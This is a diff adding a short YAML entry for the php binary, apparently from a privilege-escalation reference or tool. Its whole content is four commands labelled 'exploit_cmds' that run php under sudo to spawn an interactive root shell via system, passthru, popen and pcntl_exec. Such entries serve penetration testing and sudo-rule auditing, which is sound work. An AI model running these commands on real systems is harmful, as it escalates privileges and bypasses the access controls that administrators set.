@@ -1,0 +1,8 @@
+name: php
+binary_path: /usr/bin/php
+exploit_cmds:
+- sudo /usr/bin/php -r 'system("/bin/sh -i");'
+- sudo /usr/bin/php -r 'passthru("/bin/sh -i");'
+- sudo /usr/bin/php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096));
+  pclose($h); }'
+- sudo /usr/bin/php -r 'pcntl_exec("/bin/sh");'
